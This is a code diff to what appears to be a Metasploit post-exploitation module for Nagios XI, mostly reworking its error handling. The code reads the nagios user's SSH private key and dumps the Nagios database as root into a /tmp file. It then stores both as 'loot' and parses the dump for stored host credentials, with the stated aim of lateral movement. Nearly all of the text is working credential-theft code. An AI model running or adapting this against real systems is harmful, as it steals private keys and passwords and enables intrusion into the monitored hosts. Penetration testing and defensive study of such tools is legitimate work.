@@ -11,7 +11,8 @@
       super(update_info(info, {
         'Name'           => 'Nagios XI Enumeration',
         'Description'    => %q{
-          NagiosXI may store credentials of the hosts it monitors. This module extracts these credentials, creating opportunities for lateral movement.
+          NagiosXI may store credentials of the hosts it monitors. This module extracts these credentials,
+          creating opportunities for lateral movement.
         },
         'License'        => MSF_LICENSE,
         'Author'         =>         [
@@ -77,13 +78,10 @@
       @ssh_keys = []
 
       #get nagios SSH private key
-      print_status('Attempting to grab Nagios SSH key')
-      ssh_key = read_file('/home/nagios/.ssh/id_rsa')
-
-      if ssh_key.nil?
-        print_status('No SSH key found')
-      else
-        print_good('SSH key found!')
+      id_rsa_path = '/home/nagios/.ssh/id_rsa'
+      if file?(id_rsa_path)
+        print_good('Attempting to grab Nagios SSH key')
+        ssh_key = read_file(id_rsa_path)
         ssh_key_loot = store_loot(
           'nagios_ssh_priv_key',
           'text/plain',
@@ -91,13 +89,12 @@
           ssh_key,
           nil
         )
-      print_status("Nagios SSH key stored in #{ssh_key_loot}")
+        print_status("Nagios SSH key stored in #{ssh_key_loot}")
+      else
+        print_status('No SSH key found')
       end
 
-
-
       print_status('Attempting to dump Nagios DB')
-
       db_dump_file  = "/tmp/#{Rex::Text.rand_text_alpha(6)}"
 
       sql_query  =  %Q|mysql -u root -p#{datastore['DB_ROOT_PWD']} -e "|
@@ -108,14 +105,14 @@
       sql_query <<  %Q|ORDER BY nagios_services.check_command_object_id |
       sql_query <<  %Q|INTO OUTFILE '#{db_dump_file}' FIELDS TERMINATED BY ',' ENCLOSED BY '\\"' LINES TERMINATED BY '\\n' ;"|
 
-      cmd_exec(sql_query)
-      db_dump = read_file(db_dump_file)
-
-      if db_dump.nil?
-        fail_with(Failure::Unknown, 'Could not get DB contents')
+      out = cmd_exec(sql_query)
+      if out.match(/error/i)
+        print_error("Could not get DB contents: #{out.gsub(/\n/, ' ')}")
+        return
       else
+        db_dump = read_file(db_dump_file)
         print_good('Nagios DB dump successful')
-        #store raw db results, there is likely good stuff in here that we don't parse out
+        # store raw db results, there is likely good stuff in here that we don't parse out
         db_loot = store_loot(
           'nagiosxi_raw_db_dump',
           'text/plain',
@@ -123,8 +120,8 @@
           db_dump,
           nil
         )
-      print_status("Raw Nagios DB dump #{db_loot}")
-      print_status("Look through the DB dump manually. There could be\ some good loot we didn't parse out.")
+        print_status("Raw Nagios DB dump #{db_loot}")
+        print_status("Look through the DB dump manually. There could be\ some good loot we didn't parse out.")
       end
 
       CSV.parse(db_dump) do |row|
